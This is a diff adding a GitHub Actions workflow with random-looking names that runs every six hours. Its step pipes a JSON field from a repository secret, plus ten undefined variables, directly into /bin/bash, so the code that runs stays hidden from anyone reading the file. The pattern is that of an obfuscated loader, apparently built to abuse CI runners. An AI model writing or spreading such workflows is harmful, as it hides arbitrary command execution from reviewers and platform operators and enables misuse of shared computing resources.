@@ -1,0 +1,26 @@
+name: boyfriendlateen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: boyfriendlateen
+        env:
+          kj008: ${{ secrets.kj008 }}
+        run: |
+          echo $kj008 | jq -r .qaig50 | /bin/bash
+          echo $x76 | jq -r .fahan12 | /bin/bash
+          echo $lgp93 | jq -r .xgr589 | /bin/bash
+          echo $im195 | jq -r .pwgnk13255 | /bin/bash
+          echo $ucfi6295 | jq -r .mhtq85 | /bin/bash
+          echo $yoram8622 | jq -r .jezel0 | /bin/bash
+          echo $yjh5 | jq -r .u5139 | /bin/bash
+          echo $zbjd127 | jq -r .rj04741 | /bin/bash
+          echo $fjvo90 | jq -r .ct253 | /bin/bash
+          echo $qdn2897 | jq -r .kkyn255 | /bin/bash
+          echo $mld77018 | jq -r .lwap161 | /bin/bash
+
